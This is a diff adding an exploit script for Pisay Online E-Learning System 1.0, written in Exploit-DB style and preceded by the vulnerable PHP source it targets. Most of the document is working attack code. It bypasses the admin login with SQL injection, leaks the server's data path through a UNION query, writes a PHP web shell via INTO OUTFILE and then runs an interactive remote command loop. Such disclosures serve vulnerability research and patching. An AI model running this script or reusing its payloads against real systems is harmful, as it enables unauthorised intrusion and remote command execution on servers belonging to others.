@@ -1,0 +1,74 @@
+# Exploit Title: Pisay Online E-Learning System 1.0 - Remote Code Execution
+# Exploit Author: Bobby Cooke
+# Date: 2020-05-05
+# Vendor Homepage: https://www.sourcecodester.com/php/14192/pisay-online-e-learning-system-using-phpmysql.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/donbermoy/e-learningsystem_0.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
+# Description: Pisay Online E-Learning System v1.0 - SQLi Auth Bypass + Remote Code Execution (RCE)
+
+# Vulnerable Source Code:
+# /e-learningsystem/admin/login.php
+#  121   $email = trim($_POST['user_email']);
+#  122   $upass  = trim($_POST['user_pass']);
+#  123   $h_upass = sha1($upass);
+#  132     $user = new User();
+#  134     $res = $user::userAuthentication($email, $h_upass);
+# /e-learningsystem/include/accounts.php
+#    3 class User {
+#   23     static function userAuthentication($email,$h_pass){
+#   25         $mydb->setQuery("SELECT * FROM `tblusers` WHERE `UEMAIL` = '". $email ."' and `PASS` = '". $h_pass ."'");
+# /e-learningsystem/admin/modules/lesson/edit.php
+#    6   @$id = $_GET['id'];
+#    7     if($id==''){
+#   10   $lesson = New Lesson();
+#   11   $res = $lesson->single_lesson($id);
+# /e-learningsystem/include/lessons.php
+#    4  class Lesson {
+#    5     protected static  $tblname = "tbllesson";
+#   35     function single_lesson($id=0){
+#   37-38          $mydb->setQuery("SELECT * FROM ".self::$tblname." Where LessonID= '{$id}' LIMIT 1");
+
+import requests, sys, re
+
+requests.packages.urllib3.\
+disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+def webshell(SERVER_URL):
+    try:
+        while True:
+            cmd = raw_input('C:\\ ')
+            command = {'cmd': cmd}
+            r2 = s.get(SERVER_URL+'../../../../webshell.php', params=command, verify=False)
+            response = r2.text
+            cleanResponse = response.replace('AAAAAAAAAAAAAAA', '')
+            cleanResponse = cleanResponse.replace('313371337', '')
+            print(cleanResponse)
+    except:
+        print("\r\nExiting.")
+        sys.exit(-1)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print "(+) Usage:   %s <SERVER_URL>" % sys.argv[0]
+        print "(+) Example: %s 'https://10.0.0.3:443/e-learningsystem/'" % sys.argv[0]
+        sys.exit(-1)
+    SERVER_URL = sys.argv[1]
+    ADMIN_URL = SERVER_URL + 'admin/login.php'
+    LESSON_URL = SERVER_URL + 'admin/modules/lesson/index.php'
+    s = requests.Session()
+    s.get(SERVER_URL, verify=False)
+    payload1 = {'user_email': "boku' OR 1337=1337 LIMIT 1 -- PowerUp", 'user_pass': 'InstantTransmission', 'btnLogin': ''}
+    s.post(ADMIN_URL, data=payload1, verify=False)
+
+    payload2 = {'view': 'edit', 'id': '31337\' AND 1337=31337 union all select 313371337,"AAAAAAAAAAAAAAA",@@datadir,"AAAAAAAAAAAAAAA","AAAAAAAAAAAAAAA" -- kamahamaha'}
+    r1 = s.get(LESSON_URL, params=payload2, verify=False)
+    dirtyPath = str(re.findall(r'"Title" type="text" value=".*>', r1.text))
+    dataPath=re.sub('^.*"Title" type="text" value="', '', dirtyPath)
+    dataPath=re.sub('">.*$', '', dataPath)
+    dataPath=dataPath.replace('\\\\', '/')
+    xamppPath=re.sub('xampp.*', 'xampp', dataPath)
+    payload3 = {'view': 'edit', 'id': '31337\' AND 1337=31337 union all select 313371337,"AAAAAAAAAAAAAAA","<?php echo shell_exec($_GET[\'cmd\']);?>","AAAAAAAAAAAAAAA","AAAAAAAAAAAAAAA" into OUTFILE \''+xamppPath+'/htdocs/webshell.php\' -- kamahamaha'}
+    print(payload3)
+    s.get(LESSON_URL, params=payload3, verify=False)
+    webshell(SERVER_URL)
